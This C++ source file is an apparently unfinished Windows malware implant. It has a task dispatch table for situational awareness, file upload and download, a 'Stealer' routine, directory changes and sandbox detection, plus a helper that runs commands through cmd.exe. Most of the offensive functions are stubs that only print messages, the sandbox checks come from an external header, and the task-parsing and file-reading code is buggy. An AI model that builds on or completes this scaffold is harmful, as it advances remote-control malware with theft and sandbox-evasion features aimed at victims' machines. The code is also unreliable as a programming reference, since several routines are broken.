#include <time.h>
#include <stdio.h>
#include <string>
#include <unordered_map> // want to include standard c++ stl 
#include <iostream>
#include <windows.h>
#include "nlohmann\json.hpp"
#include "Feiyu\sandbox_detection.h"


using json = nlohmann::json;

void task_do(json task);
void task_dispatcher(char * body);

/* main execute function*/
char * execute(char * program, char *args, char* outfile){
     LPSTR cmdBuffer = (char *)malloc(1000 * sizeof(char));
    if (cmdBuffer == NULL){
        printf("malloc failed");
        exit(1);
    }
    int j = sprintf(cmdBuffer, "cmd.exe /C ");
     j += sprintf(cmdBuffer + j, program );
     j += sprintf(cmdBuffer+ j, " ");
    j += sprintf(cmdBuffer + j, args );
    j += sprintf(cmdBuffer+ j, " ");
    j += sprintf(cmdBuffer + j, " > ");
    j += sprintf(cmdBuffer + j, outfile);
    j += sprintf(cmdBuffer + j, "\0");
    // Values needed for CreateProcessA
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    // Dead squirrels
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    // Dead squirrels 
    ZeroMemory(&pi, sizeof(pi));
    int retVal;

    
    retVal = CreateProcessA(    // No module name (use command line)
        NULL,        // Command line
        cmdBuffer,
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to TRUE binheritance
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi ) ;          // Pointer to PROCESS_INFORMATION structure
    
    if (retVal == 0){
        printf("Create process failed\n");
        exit(0);
    }
    WaitForSingleObject( pi.hProcess, INFINITE );
    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    free(cmdBuffer);
    return NULL;

}


/* start of implant functions*/

void  FileUpload(std::string  args){
}

void FileDownload(std::string  args){

}

void SitAware(std::string  args){
    //implant id, computer name, usernmae, GUI, integrity, ip address, session key?, last seen
    //expected checkin -
    printf("WHOAMI\n"); 
}

void Stealer(std::string  args){
    printf("DOING THIEVERY\n");
}

void SandboxDetector(std::string args){
    if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
        printf("IN SANDBOX");
    }
}

/* 
void ExecuteFile(std::string args){
    char *outfile = "tmp";
    char *prog = args.c_str();
    
    execute(prog, "", outfile);
}
*/

void changeDirectory(std::string args){
    std::wstring get_wstring(args.begin(), args.end());
    LPCWSTR temp = get_wstring.c_str();
    //LPWSTR temp = args.c_str();
    LPCTSTR lpPathName = (LPCTSTR)temp ;
    if (!SetCurrentDirectory( lpPathName)){
        printf("Changing directory failed\n");
    }
    //result?
    //char buf = (char *)malloc(4096);


}


/* Dispatch Table Init*/
using pfunc = void (*)(std::string );
std::unordered_map<std::string , pfunc > dispatch_table;


void DispatchTableInit(){
    dispatch_table["SitAware"] = Stealer;
    dispatch_table["FileDown"] = FileDownload;
    dispatch_table["FileUp"] = FileUpload;
    dispatch_table["Stealer"] = Stealer;
    //dispatch_table["ExecuteFile"] = ExecuteFile;
    dispatch_table["Sandbox"] = SandboxDetector;
    dispatch_table["Directory"] = changeDirectory;


    }


/*task functions*/
//tasks are lists of tasks structured [cmd: , args:, taskid: ]
void tasks_dispatch(const char * body){
    
    json tasks = json::parse(body); //json array of tasks
    //json tasks_arr = tasks["Tasks"];
    int numTasks = tasks["NumTasks"];
    char * comm;
    char * args;
    json task;
    for (int i = 0; i < numTasks; i ++){
        //task = json::parse( tasks_arr[i]);
        task_do(task);
        //get results
    }
   
}

//create results arr and return

void task_do(json task){
    std::cout << task["cmd"] << '\n';
    std::cout << task["args"] << '\n';

}


/* other helper functions necessary*/
std::string  readFile(char * fileName){
     //GetFileSize
    DWORD fileSize;
    char* buffer;
    fflush(stdin);
    FILE * infile = fopen(fileName, "r");
    int size;
    
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    buffer = (char *)malloc(size);
    
    fread(buffer,sizeof(char *), size, infile );
    std::string  buf;
    buf = std::string (buffer);
    return buf;
    
}


int main(int argc, char *argv[]){

    DispatchTableInit(); //create the map of std::strings to funcrtions
    //example of how to call the right function
    pfunc p = dispatch_table["Stealer"];
    std::string args = "";
    (*p)(args);
    return 0;
}